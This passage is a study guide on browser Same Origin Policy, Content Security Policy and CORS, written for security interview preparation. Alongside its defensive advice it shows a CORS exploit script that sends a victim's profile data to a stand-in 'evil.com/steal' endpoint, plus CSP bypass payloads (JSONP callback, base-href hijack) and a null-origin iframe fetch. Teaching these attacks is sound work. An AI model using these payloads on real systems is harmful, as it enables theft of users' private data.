# SOP, CSP & CORS — Zero to Hero

> Comprehensive guide covering Same Origin Policy, Content Security Policy, and Cross-Origin Resource Sharing. FAANG Security Engineer interview-ready.

---

## Table of Contents

### Part I — Same Origin Policy (SOP)
1. [What Is the Same Origin Policy?](#1-what-is-the-same-origin-policy)
2. [Defining "Origin" — Scheme + Host + Port](#2-defining-origin--scheme--host--port)
3. [What SOP Blocks vs. Allows](#3-what-sop-blocks-vs-allows)
4. [SOP and Cookies / DOM / Network Requests](#4-sop-and-cookies--dom--network-requests)
5. [Bypassing SOP — Legitimate Mechanisms](#5-bypassing-sop--legitimate-mechanisms)
6. [Attacks That Exploit SOP Gaps](#6-attacks-that-exploit-sop-gaps)
7. [SOP Interview Deep Dive](#7-sop-interview-deep-dive)

### Part II — Content Security Policy (CSP)
8. [What Is CSP and Why It Exists](#8-what-is-csp-and-why-it-exists)
9. [How CSP Is Delivered](#9-how-csp-is-delivered)
10. [CSP Directive Reference](#10-csp-directive-reference)
11. [Source Expressions — The Building Blocks](#11-source-expressions--the-building-blocks)
12. [Nonces and Hashes — Modern CSP](#12-nonces-and-hashes--modern-csp)
13. [Strict CSP vs. Allowlist CSP](#13-strict-csp-vs-allowlist-csp)
14. [CSP Reporting and Monitoring](#14-csp-reporting-and-monitoring)
15. [Real-World CSP Examples](#15-real-world-csp-examples)
16. [Common CSP Bypasses and Pitfalls](#16-common-csp-bypasses-and-pitfalls)
17. [CSP Interview Deep Dive](#17-csp-interview-deep-dive)

### Part III — Cross-Origin Resource Sharing (CORS)
18. [What Is CORS and Why We Need It](#18-what-is-cors-and-why-we-need-it)
19. [Simple vs. Preflighted Requests](#19-simple-vs-preflighted-requests)
20. [CORS Headers — Complete Reference](#20-cors-headers--complete-reference)
21. [Preflight Deep Dive (OPTIONS)](#21-preflight-deep-dive-options)
22. [Credentialed Requests](#22-credentialed-requests)
23. [Common CORS Misconfigurations](#23-common-cors-misconfigurations)
24. [CORS Attack Scenarios](#24-cors-attack-scenarios)
25. [Secure CORS Implementation Patterns](#25-secure-cors-implementation-patterns)
26. [CORS Interview Deep Dive](#26-cors-interview-deep-dive)

### Part IV — Putting It All Together
27. [How SOP, CSP, and CORS Interact](#27-how-sop-csp-and-cors-interact)
28. [Defense-in-Depth Header Strategy](#28-defense-in-depth-header-strategy)
29. [Production Security Checklist](#29-production-security-checklist)
30. [FAANG Interview Questions — Master Set](#30-faang-interview-questions--master-set)

---

# Part I — Same Origin Policy (SOP)

## 1. What Is the Same Origin Policy?

The **Same Origin Policy** is the most fundamental security mechanism built into every web browser. It's the default wall that prevents one website from reading data belonging to another website.

> 💡 **Core Principle:** A script running in the context of Origin A **cannot read** responses, DOM content, or storage belonging to Origin B — even if the browser successfully fetched the resource. SOP restricts *reading*, not *sending*.

SOP was introduced in Netscape Navigator 2.0 (1995) and has been the bedrock of browser security ever since. Without it, any webpage you visit could silently read your email, access your bank account data, and steal session tokens from every other site you're logged into.

## 2. Defining "Origin" — Scheme + Host + Port

An **origin** is defined as the tuple of three components:

```
Origin = Scheme + Host + Port

https://  +  example.com  +  :443
(scheme)     (host)          (port)
```

| URL A | URL B | Same Origin? | Reason |
|-------|-------|:---:|--------|
| `https://example.com/a` | `https://example.com/b` | ✅ Yes | Path differs — irrelevant |
| `https://example.com` | `http://example.com` | ❌ No | Scheme differs (https vs http) |
| `https://example.com` | `https://api.example.com` | ❌ No | Host differs (subdomain) |
| `https://example.com` | `https://example.com:8443` | ❌ No | Port differs (443 vs 8443) |
| `https://example.com:443` | `https://example.com` | ✅ Yes | Port 443 is default for HTTPS |

> ⚠️ **Common Gotcha:** `http://example.com` and `https://example.com` are **different origins**. The scheme matters. `example.com` and `www.example.com` are also **different origins**. Subdomains are different hosts.

## 3. What SOP Blocks vs. Allows

SOP is nuanced — it doesn't block *everything* cross-origin. Understanding what's blocked vs. allowed is critical:

| Action | Cross-Origin? | Why |
|--------|:---:|-----|
| Embedding images (`<img>`) | ✅ Allowed | Write-only: image renders, but JS can't read pixels |
| Embedding scripts (`<script>`) | ✅ Allowed | Script executes in loading page's origin |
| Embedding CSS (`<link>`) | ✅ Allowed | Styles apply; content not readable via JS |
| Embedding iframes | ✅ Allowed | Frame renders, but parent can't access its DOM |
| Form submissions | ✅ Allowed | Navigation/write — browser sends but JS can't read response |
| Reading iframe DOM | ❌ Blocked | Would leak cross-origin data |
| XMLHttpRequest / fetch response | ❌ Blocked* | Response is opaque unless CORS allows it |
| Reading cross-origin cookies | ❌ Blocked | Cookie jar is partitioned by origin/domain |
| Accessing localStorage / IndexedDB | ❌ Blocked | Storage is origin-scoped |
| Reading canvas after cross-origin image drawn | ❌ Blocked | "Tainted canvas" — prevents pixel exfiltration |

*\* The request may still be sent; SOP blocks reading the response.*

> 🔑 **Key Insight: SOP Blocks Reads, Not Writes**
>
> This is *the most important* thing to understand. Cross-origin **writes** (sending form data, navigating, embedding) are generally allowed. Cross-origin **reads** (accessing response data, reading DOM, inspecting pixels) are blocked. This asymmetry is why CSRF attacks are possible — the browser happily *sends* the request with cookies, it just won't let the attacker *read* the response.

## 4. SOP and Cookies / DOM / Network Requests

### 4.1 Cookie Scope vs. Origin

Cookies don't follow origin rules exactly — they use **domain + path** matching, which is looser:
- A cookie set for `.example.com` is sent to `api.example.com`, `www.example.com`, etc.
- SOP considers those different origins, but cookies are shared
- This mismatch is a common source of vulnerabilities

> 🔴 **The Cookie/Origin Mismatch Problem:** If `evil.example.com` is compromised, it can set cookies for `.example.com`, potentially overwriting session cookies used by `app.example.com`. This is called a **cookie tossing** attack.

### 4.2 DOM Access

JavaScript in one frame cannot access the DOM of a cross-origin frame. Attempting `iframe.contentDocument` on a cross-origin frame throws a `SecurityError`.

Exception: `document.domain` relaxation (deprecated) — if both pages set `document.domain = "example.com"`, subdomains can access each other's DOM. This is being removed from browsers.

### 4.3 Network Requests

When JavaScript makes a cross-origin `fetch()` or `XMLHttpRequest`:

1. The browser **sends the request** (SOP doesn't prevent this)
2. The server responds normally
3. The browser checks CORS headers on the response
4. If no CORS headers → browser **blocks JavaScript from reading the response**

## 5. Bypassing SOP — Legitimate Mechanisms

| Mechanism | How It Works | Security Consideration |
|-----------|-------------|----------------------|
| **CORS** | Server sends headers allowing specific origins to read responses | Most flexible; covered in Part III |
| **postMessage** | Windows/frames send messages to each other explicitly | Must validate `origin` in receiver |
| **JSONP** | Script tag loads cross-origin JS that calls a callback | Legacy; no error handling; XSS risk if callback unsanitized |
| **document.domain** | Both pages relax to shared parent domain | Deprecated; weakens isolation for all subdomains |
| **Server-side proxy** | Your server fetches the resource and returns it | SOP is browser-only; servers have no such restriction |
| **WebSockets** | Not subject to SOP after handshake | Server must validate `Origin` header during handshake |

## 6. Attacks That Exploit SOP Gaps

### 6.1 Cross-Site Request Forgery (CSRF)

Since SOP allows cross-origin *writes*, an attacker's page can submit forms to your bank. The browser attaches cookies automatically.

```
evil.com → POST /transfer (with victim's cookies) → bank.com
Attacker can't read the response, but the transfer already happened!
```

**Defenses:** CSRF tokens, SameSite cookies, checking Origin/Referer headers.

### 6.2 Cross-Site Script Inclusion (XSSI)

Since `<script>` tags can load cross-origin JS, if a server returns sensitive data as valid JavaScript (e.g., JSONP-style), an attacker can include it and capture the data.

### 6.3 DNS Rebinding

Attacker controls DNS for their domain. Initially resolves to their server, then rebinds to `127.0.0.1`. Browser considers it same-origin to the attacker's domain, allowing JS to read local services.

### 6.4 Spectre / Side-Channel Attacks

CPU-level attacks that can read cross-origin data through timing side channels. Browsers now use **Site Isolation** (separate processes per origin) as mitigation.

## 7. SOP Interview Deep Dive

**Q: "What is the Same Origin Policy and what does it protect against?"**

> **Model Answer:** "SOP is the browser's fundamental security boundary that prevents scripts running in one origin from reading data belonging to another origin. An origin is defined by scheme + host + port. Crucially, SOP restricts *reads* not *writes* — a page can embed cross-origin images, submit forms cross-origin, and load scripts, but it can't read the response data, access another origin's DOM, or inspect cross-origin storage. This protects users' data from being exfiltrated by malicious sites. CORS exists as the controlled mechanism to relax SOP when legitimate cross-origin access is needed."

**Q: "If SOP prevents cross-origin reads, why are CSRF attacks still possible?"**

> **Model Answer:** "Because SOP blocks *reads* but allows *writes*. A CSRF attack exploits the fact that the browser will send a cross-origin POST request and automatically include the victim's cookies. The attacker doesn't need to read the response — the state-changing action (transfer money, change password) already executed on the server. Defenses include anti-CSRF tokens, SameSite cookie attribute, and server-side validation of Origin/Referer headers."

**Q: "How do cookies and SOP interact? Are they the same scope?"**

> **Model Answer:** "No — this is a critical distinction. SOP defines origin as scheme + host + port, where `sub.example.com` is different from `example.com`. But cookies use domain-based scoping: a cookie set for `.example.com` is sent to all subdomains. This mismatch means a compromised subdomain can set or overwrite cookies for the parent domain (cookie tossing), and cookies may be sent cross-origin from an SOP perspective. This is why additional defenses like `__Host-` cookie prefixes and `SameSite` attributes are important."

---

# Part II — Content Security Policy (CSP)

## 8. What Is CSP and Why It Exists

**Content Security Policy** is a security layer that tells the browser exactly which resources are allowed to load and execute on a page. It's the most powerful defense against **Cross-Site Scripting (XSS)**.

> 💡 **Core Principle:** Without CSP, any injected script runs with full page privileges. CSP creates a whitelist (or uses nonces/hashes) so that even if an attacker injects HTML, the browser **refuses to execute unauthorized scripts**.

**What CSP protects against:**
- **XSS (reflected, stored, DOM-based)** — the primary use case
- **Data exfiltration** — restrict where data can be sent via `connect-src`
- **Clickjacking** — `frame-ancestors` replaces `X-Frame-Options`
- **Mixed content** — `upgrade-insecure-requests`
- **Malicious plugins** — `object-src 'none'`

## 9. How CSP Is Delivered

### 9.1 HTTP Response Header (Preferred)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

### 9.2 Meta Tag (Limited)

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src *">
```

Limitations: `frame-ancestors`, `sandbox`, and `report-uri` directives are **not supported** via meta tags.

### 9.3 Report-Only Mode (Testing)

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
```

Violations are reported but **not enforced**. Use this to test policies before deploying.

## 10. CSP Directive Reference

| Directive | Controls | Example |
|-----------|----------|---------|
| `default-src` | Fallback for all *-src directives | `'self'` |
| `script-src` | JavaScript sources | `'self' 'nonce-xyz'` |
| `style-src` | CSS sources | `'self' 'unsafe-inline'` |
| `img-src` | Image sources | `'self' data: https:` |
| `connect-src` | fetch, XHR, WebSocket, EventSource | `'self' https://api.example.com` |
| `font-src` | Font files | `'self' https://fonts.gstatic.com` |
| `object-src` | Plugins (Flash, Java) | `'none'` ← always |
| `media-src` | Audio/video | `'self'` |
| `frame-src` | Sources for iframes | `'self' https://youtube.com` |
| `frame-ancestors` | Who can embed this page | `'self'` (replaces X-Frame-Options) |
| `base-uri` | Restricts `<base>` element | `'self'` |
| `form-action` | Valid form submission targets | `'self'` |
| `worker-src` | Web Workers, Service Workers | `'self'` |
| `manifest-src` | App manifests | `'self'` |
| `navigate-to` | Where the page can navigate | `'self'` (experimental) |

> ⚠️ **The default-src Fallback Chain:** If `script-src` is not set, the browser falls back to `default-src`. If `default-src` is not set, the browser defaults to `*` (allow everything). **Always set `default-src`** as your baseline.

## 11. Source Expressions — The Building Blocks

| Expression | Meaning | Security Note |
|------------|---------|---------------|
| `'none'` | Block everything | Most restrictive — use for unused directives |
| `'self'` | Same origin only | Safe baseline |
| `'unsafe-inline'` | Allow inline scripts/styles | 🔴 Defeats XSS protection — avoid! |
| `'unsafe-eval'` | Allow eval(), Function(), setTimeout(string) | 🔴 Dangerous — avoid! |
| `'nonce-{random}'` | Allow elements with matching nonce attribute | ✅ Best practice for scripts |
| `'sha256-{hash}'` | Allow elements with matching content hash | ✅ Good for static inline scripts |
| `'strict-dynamic'` | Nonce'd scripts can load additional scripts | ✅ Modern CSP — propagates trust |
| `https:` | Any HTTPS URL | Very broad; not recommended alone |
| `data:` | Data URIs | Can be used for XSS; use cautiously |
| `blob:` | Blob URLs | Use only when specifically needed |
| `*.example.com` | Wildcard subdomain | Any subdomain matches — broad |

## 12. Nonces and Hashes — Modern CSP

### 12.1 Nonce-Based CSP

A **nonce** (number used once) is a random value generated per-request. Only scripts with the matching nonce execute.

```http
Content-Security-Policy:
  script-src 'nonce-4AEemGb0xJptoIGFP3Nd' 'strict-dynamic';
```

```html
<!-- This script runs ✅ -->
<script nonce="4AEemGb0xJptoIGFP3Nd">
  console.log('Authorized!');
</script>

<!-- Injected by attacker — no nonce → blocked ❌ -->
<script>steal(document.cookie)</script>
```

> ✅ **Nonce Best Practices:**
> - Generate cryptographically random nonces (≥ 128 bits / 16 bytes)
> - Generate a **new nonce for every response** — never reuse
> - Never put the nonce in a URL or anywhere an attacker can read it
> - Combine with `'strict-dynamic'` for propagated trust

### 12.2 Hash-Based CSP

Instead of a nonce, hash the exact content of the inline script:

```http
Content-Security-Policy:
  script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8=';
```

```html
<!-- Matches the hash → runs ✅ -->
<script>doSomething();</script>
```

Hashes are great for **static** inline scripts but impractical if script content changes per request.

## 13. Strict CSP vs. Allowlist CSP

### Allowlist CSP (Legacy)

```
script-src 'self' https://cdn.example.com https://www.google.com https://apis.google.com
```

**Problems:**
- CDNs host thousands of scripts — any can be loaded
- JSONP endpoints on allowed domains = CSP bypass
- Maintaining the list is a nightmare
- Research shows **94% of allowlist CSPs are bypassable**

### Strict CSP (Recommended)

```
script-src 'nonce-{random}' 'strict-dynamic';
object-src 'none';
base-uri 'self';
```

**Benefits:**
- No domain allowlist to maintain
- Attacker can't guess the nonce
- `strict-dynamic` lets nonce'd scripts load dependencies
- Google's recommended approach

> 🔑 **strict-dynamic Explained:** When you add `'strict-dynamic'`, scripts loaded by an already-trusted (nonce'd) script inherit trust automatically. This means you don't need to allowlist every CDN — your nonce'd bootstrap script can load libraries dynamically. The browser ignores allowlist entries like `'self'` and URL-based expressions when `'strict-dynamic'` is present.

## 14. CSP Reporting and Monitoring

### 14.1 Report-URI and report-to

```http
Content-Security-Policy:
  default-src 'self';
  report-uri /csp-report;
  report-to csp-endpoint;

Reporting-Endpoints:
  csp-endpoint="https://example.com/csp-reports"
```

### 14.2 Violation Report Structure

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/xss.js",
    "source-file": "https://example.com/page",
    "line-number": 42,
    "status-code": 200
  }
}
```

> ✅ **Deployment Strategy:**
> 1. **Audit:** Identify all resources your app loads
> 2. **Report-Only:** Deploy CSP in report-only mode, monitor for violations
> 3. **Fix:** Update code to comply (add nonces, remove inline scripts)
> 4. **Enforce:** Switch to enforcing mode
> 5. **Monitor:** Continue collecting reports to catch regressions

## 15. Real-World CSP Examples

### 15.1 Google's CSP (Strict Nonce-Based)

```
script-src 'nonce-random' 'strict-dynamic' 'report-sample' 'unsafe-eval' https: http:;
object-src 'none';
base-uri 'self';
report-uri /csp-report
```

Note: `https:` and `http:` are ignored because `strict-dynamic` is present — they're fallbacks for older browsers.

### 15.2 GitHub's CSP

```
default-src 'none';
script-src github.githubassets.com;
style-src 'unsafe-inline' github.githubassets.com;
img-src 'self' data: *.githubusercontent.com;
connect-src 'self' *.github.com wss://*.github.com;
frame-ancestors 'none'
```

### 15.3 Minimal Secure Starter

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  connect-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

## 16. Common CSP Bypasses and Pitfalls

### 🔴 Bypass #1: JSONP Endpoints on Allowed Domains

If `script-src` allows `https://accounts.google.com`, an attacker can use:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

The JSONP endpoint wraps the callback name in JS, executing arbitrary code.

### 🔴 Bypass #2: CDN-Hosted Libraries

If `script-src` allows a CDN like `cdnjs.cloudflare.com`, an attacker can load Angular.js and use template injection to execute arbitrary code — all from the "allowed" domain.

### 🔴 Bypass #3: Base-URI Hijacking

Without `base-uri 'self'`, an attacker injects `<base href="https://evil.com">`. Now all relative script paths load from the attacker's server. **Always set `base-uri 'self'` or `'none'`.**

### 🔴 Bypass #4: unsafe-inline + DOM Manipulation

If `'unsafe-inline'` is allowed, CSP provides almost no XSS protection. Attacker-injected inline scripts run freely.

### 🔴 Bypass #5: Script Gadgets

Modern JS frameworks (Angular, React, Vue) have patterns that can evaluate attacker-controlled data. Even with CSP, if the framework is loaded, gadgets like `ng-click` or template expressions can execute code.

## 17. CSP Interview Deep Dive

**Q: "How would you implement CSP for a large web application?"**

> **Model Answer:** "I'd follow a phased approach. First, audit all resource loads using browser dev tools and document every script, style, image, and connection. Second, deploy a **report-only CSP** that uses strict nonce-based policy with `script-src 'nonce-{random}' 'strict-dynamic'`, `object-src 'none'`, and `base-uri 'self'`. Third, monitor violation reports for weeks, fixing code that relies on inline scripts by adding nonces or moving scripts to external files. Fourth, switch to enforcement mode while continuing to monitor. The key is using nonces + strict-dynamic instead of domain allowlists — Google's research shows 94% of allowlist-based CSPs are bypassable through JSONP endpoints and CDN-hosted libraries."

**Q: "What is strict-dynamic and why does it matter?"**

> **Model Answer:** "`strict-dynamic` is a CSP expression that propagates trust from nonce'd scripts to scripts they dynamically load. This solves the practical problem of applications using module loaders, bundlers, or dynamically created script elements. When `strict-dynamic` is present, the browser ignores allowlist entries like `'self'` and URL-based sources for `script-src`, relying entirely on nonces. This means if an attacker injects a script tag without the correct nonce, it won't execute — even if its URL is on an allowlisted domain."

**Q: "A developer says CSP is breaking their site. How do you debug?"**

> **Model Answer:** "First, switch to `Content-Security-Policy-Report-Only` mode so the site stays functional while collecting violation data. Check the browser console — CSP violations are logged with the violated directive and blocked URI. Use the `report-uri` directive to send violations to a logging endpoint. Common issues: inline event handlers (move to `addEventListener`), inline styles (add hashes or move to stylesheets), third-party scripts needing nonces, and `eval()` usage (refactor or add `'unsafe-eval'` as last resort). Fix violations systematically, then enforce."

---

# Part III — Cross-Origin Resource Sharing (CORS)

## 18. What Is CORS and Why We Need It

**CORS** is a protocol that allows servers to declare which origins may read their responses. It's the *controlled relaxation* of the Same Origin Policy.

> 💡 **The Problem CORS Solves:** Modern web apps need cross-origin communication: a frontend on `app.example.com` calling an API on `api.example.com`, a SPA loading fonts from Google, analytics pinging a third-party service. SOP blocks all cross-origin reads by default. CORS is the server's way of saying "I trust requests from this specific origin."

### CORS Flow — Simple Request

```
1. Browser sends:    GET /data  |  Origin: app.example.com  →  api.example.com
2. Server responds:  200 OK  |  Access-Control-Allow-Origin: app.example.com  →  Browser
3. Browser:  ✅ origin allowed, JS can read response
```

## 19. Simple vs. Preflighted Requests

The browser categorizes cross-origin requests into two types:

### 19.1 Simple Requests (No Preflight)

A request is "simple" if **all** of the following are true:
- Method is `GET`, `HEAD`, or `POST`
- Headers are only: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
- `Content-Type` is only: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`
- No `ReadableStream` in the request body
- No event listeners on the `XMLHttpRequest.upload` object

### 19.2 Preflighted Requests

Anything else triggers a **preflight** — the browser sends an OPTIONS request first to ask the server if the actual request is allowed.

Triggers for preflight:
- Methods: `PUT`, `DELETE`, `PATCH`
- Custom headers: `Authorization`, `X-Custom-Header`
- `Content-Type: application/json`

### Preflight Flow

```
Step 1 — Preflight:
Browser → OPTIONS /api/data
         Origin: app.example.com
         Access-Control-Request-Method: PUT
         Access-Control-Request-Headers: Content-Type, Authorization

Step 2 — Preflight Response:
Server  → 204 No Content
         Access-Control-Allow-Origin: app.example.com
         Access-Control-Allow-Methods: PUT
         Access-Control-Allow-Headers: Content-Type, Authorization
         Access-Control-Max-Age: 86400

Step 3 — Actual Request:
Browser → PUT /api/data
         Origin: app.example.com
         Authorization: Bearer token123
```

## 20. CORS Headers — Complete Reference

### 20.1 Response Headers (Server → Browser)

| Header | Purpose | Example Value |
|--------|---------|---------------|
| `Access-Control-Allow-Origin` | Which origin can read the response | `https://app.example.com` or `*` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods (preflight) | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed request headers (preflight) | `Content-Type, Authorization` |
| `Access-Control-Expose-Headers` | Headers JS can read from response | `X-Request-Id, X-RateLimit-Remaining` |
| `Access-Control-Max-Age` | Preflight cache duration (seconds) | `86400` (24 hours) |
| `Access-Control-Allow-Credentials` | Allow cookies/auth in request | `true` |

### 20.2 Request Headers (Browser → Server)

| Header | Purpose | Sent When |
|--------|---------|-----------|
| `Origin` | Requesting page's origin | Every cross-origin request |
| `Access-Control-Request-Method` | Method for the actual request | Preflight only |
| `Access-Control-Request-Headers` | Custom headers for the actual request | Preflight only |

> ⚠️ **Exposed Headers:** By default, JS can only read these response headers: `Cache-Control`, `Content-Language`, `Content-Length`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`. Custom headers require `Access-Control-Expose-Headers` to be listed explicitly.

## 21. Preflight Deep Dive (OPTIONS)

### 21.1 Why Preflight Exists

Preflight protects servers that were built before CORS existed. Imagine a pre-CORS server that accepts `DELETE /user/123` — it never expected a browser to send that cross-origin. Without preflight, a malicious page could send DELETE requests. Preflight ensures the server explicitly opts in to receiving non-simple cross-origin requests.

### 21.2 Preflight Caching

`Access-Control-Max-Age` tells the browser how long to cache preflight results. Without it, *every* non-simple request gets two HTTP requests (OPTIONS + actual).

```
// Browser limits (regardless of server header):
// Chrome: max 7200 (2 hours)
// Firefox: max 86400 (24 hours)
// Safari: max 604800 (7 days)
```

### 21.3 The "null" Origin

Certain contexts send `Origin: null`:
- Data URIs
- Sandboxed iframes (without `allow-same-origin`)
- Local HTML files (`file://`)
- Redirects in some browsers

> 🔴 **Never Allow "null" Origin:** `Access-Control-Allow-Origin: null` is dangerous because an attacker can use a sandboxed iframe to send requests with `Origin: null`:
> ```html
> <iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://api.target.com')</script>"></iframe>
> ```

## 22. Credentialed Requests

By default, cross-origin requests don't include cookies or authentication. To include them:

```javascript
// Client must opt in:
fetch('https://api.example.com/data', {
  credentials: 'include'   // send cookies cross-origin
});
```

```http
// Server must respond with BOTH:
Access-Control-Allow-Origin: https://app.example.com  // NOT *
Access-Control-Allow-Credentials: true
```

> 🔑 **The Wildcard + Credentials Rule:** When `Access-Control-Allow-Credentials: true` is set:
> - `Access-Control-Allow-Origin` **cannot** be `*` — must be a specific origin
> - `Access-Control-Allow-Headers` **cannot** be `*`
> - `Access-Control-Allow-Methods` **cannot** be `*`
> - `Access-Control-Expose-Headers` **cannot** be `*`
>
> The browser enforces this strictly. If the server responds with `*` and `credentials: true`, the browser blocks the response.

## 23. Common CORS Misconfigurations

### 🔴 Misconfiguration #1: Reflecting the Origin Header

Server blindly echoes the request's `Origin` header in `Access-Control-Allow-Origin`:

```python
# Vulnerable server code
Access-Control-Allow-Origin: {request.headers['Origin']}
Access-Control-Allow-Credentials: true
```

This allows **any** origin to make authenticated requests and read responses. It's equivalent to having no SOP at all.

### 🔴 Misconfiguration #2: Regex Bypass

Server checks if origin *contains* "example.com":

```python
# Vulnerable regex
if "example.com" in origin:  # Bypassed by evilexample.com
    allow(origin)

# Also vulnerable:
if origin.endswith(".example.com"):  # Bypassed by evil.example.com if subdomain takeover
    allow(origin)
```

### 🔴 Misconfiguration #3: Wildcard with Credentials

Some servers try `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. The browser blocks this, so developers then switch to reflecting the origin — creating misconfiguration #1.

### 🔴 Misconfiguration #4: Pre-Domain Wildcard

Allowing `*.example.com` in the origin check. If any subdomain is compromised or an attacker can get a subdomain (e.g., via dangling DNS), they have full API access.

## 24. CORS Attack Scenarios

### 24.1 Stealing User Data via Reflected Origin

```javascript
// Attacker's page on evil.com
fetch('https://vulnerable-api.com/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    // Send victim's data to attacker
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

This works because the vulnerable server reflects `Origin: https://evil.com` back in `Access-Control-Allow-Origin` with credentials allowed.

### 24.2 Internal Network Scanning via CORS

If a server on the internal network has CORS misconfigured, a page on the public internet can reach internal APIs through the victim's browser (which has network access).

## 25. Secure CORS Implementation Patterns

### ✅ Pattern 1: Explicit Allowlist

```python
ALLOWED_ORIGINS = {
    "https://app.example.com",
    "https://staging.example.com",
}

def cors_middleware(request, response):
    origin = request.headers.get("Origin")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Vary"] = "Origin"  # ← Critical!
```

### ✅ Pattern 2: Public API (No Credentials)

```http
Access-Control-Allow-Origin: *
# No Access-Control-Allow-Credentials header
# Safe because no cookies are sent; only public data returned
```

### ✅ Pattern 3: Always Include Vary: Origin

When you dynamically set `Access-Control-Allow-Origin` based on the request's `Origin` header, you **must** include `Vary: Origin`. Without it, CDNs and proxies may cache a response with one origin and serve it to another, leaking data or causing CORS failures.

### Secure CORS Checklist

- [ ] Never reflect `Origin` header blindly
- [ ] Use an explicit allowlist of trusted origins
- [ ] Never allow `Origin: null`
- [ ] Include `Vary: Origin` when reflecting origin dynamically
- [ ] Only use `Access-Control-Allow-Credentials: true` when actually needed
- [ ] Set `Access-Control-Max-Age` to reduce preflight overhead
- [ ] Don't use `*` for Allow-Methods/Allow-Headers with credentials
- [ ] Validate regex-based origin checks against edge cases
- [ ] Test CORS configuration with tools (curl, browser devtools)

## 26. CORS Interview Deep Dive

**Q: "Explain the CORS preflight mechanism. When does it trigger?"**

> **Model Answer:** "A CORS preflight is an automatic OPTIONS request sent by the browser before the actual cross-origin request when the request is 'non-simple.' A request is non-simple if it uses a method other than GET/HEAD/POST, includes custom headers like Authorization, or has Content-Type other than form-urlencoded/multipart/text. The browser sends OPTIONS with `Access-Control-Request-Method` and `Access-Control-Request-Headers`. The server must respond with the appropriate `Access-Control-Allow-*` headers. Only if the preflight passes does the browser send the actual request. Preflight exists to protect legacy servers that never expected cross-origin non-simple requests from browsers."

**Q: "You're auditing a server and see it reflects the Origin header with Allow-Credentials: true. What's the risk?"**

> **Model Answer:** "This is a critical vulnerability. The server is essentially disabling same-origin protections for authenticated requests. An attacker can host a page on `evil.com` that makes fetch requests to the vulnerable API with `credentials: 'include'`. The server will respond with `Access-Control-Allow-Origin: https://evil.com` and `Allow-Credentials: true`, so the browser allows the attacker's JavaScript to read the response — which includes the victim's private data. The fix is to use an explicit allowlist of trusted origins instead of reflecting the request Origin. Additionally, you should add `Vary: Origin` to prevent cache poisoning."

**Q: "Why can't you use Access-Control-Allow-Origin: * with credentials?"**

> **Model Answer:** "The wildcard `*` with `Allow-Credentials: true` would mean 'any website can make authenticated requests and read responses' — effectively removing all browser security for that API. The spec intentionally prohibits this combination. The browser will block the response even if the server sends both headers. If you need credentialed cross-origin access, you must explicitly specify the allowed origin. This forces developers to make a conscious decision about which origins they trust with their users' credentials."

---

# Part IV — Putting It All Together

## 27. How SOP, CSP, and CORS Interact

> 🧩 **The Three Layers:**
> - **SOP** = The default wall. Blocks cross-origin reads. Always on.
> - **CORS** = A controlled door in the wall. Lets specific origins read cross-origin responses.
> - **CSP** = Rules about what your page can load and execute. Prevents injection attacks.

### How They Work Together

```
Request leaves browser → SOP: Is this cross-origin?
If cross-origin read    → CORS: Did server allow this origin? → Yes → JS can read response
Meanwhile               → CSP: Is this resource allowed to load/execute? → No → Block even if same-origin!
```

### Important Interactions

| Scenario | SOP | CORS | CSP | Result |
|----------|:---:|:----:|:---:|--------|
| Same-origin script load | ✅ Allows | N/A | Must match policy | CSP decides |
| Cross-origin script via `<script>` | ✅ Allows embedding | Not needed for tags | Must match `script-src` | CSP decides |
| Cross-origin fetch() | ❌ Blocks read | Must allow origin | Must match `connect-src` | Both must allow |
| Cross-origin font | ❌ Blocks (fonts require CORS) | Must allow origin | Must match `font-src` | Both must allow |
| Inline script execution | N/A (same page) | N/A | Must have nonce/hash or `unsafe-inline` | CSP decides |

> ⚠️ **CSP ≠ CORS:** A common confusion: CSP's `connect-src` restricts which URLs your page can *contact*. CORS restricts which origins can *read responses*. You need both:
> - `connect-src` must allow the target URL (client-side restriction)
> - The target server must send CORS headers allowing your origin (server-side restriction)

## 28. Defense-in-Depth Header Strategy

```http
# Complete security header set for production

# Content Security Policy (strict nonce-based)
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests;

# CORS (API responses only — not for HTML pages)
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 7200
Vary: Origin

# Additional security headers
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

## 29. Production Security Checklist

### SOP
- [ ] Serve all pages over HTTPS to maintain same-origin integrity
- [ ] Don't use `document.domain` relaxation
- [ ] Validate `origin` parameter in `postMessage` handlers

### CSP
- [ ] Deploy nonce-based CSP with `'strict-dynamic'`
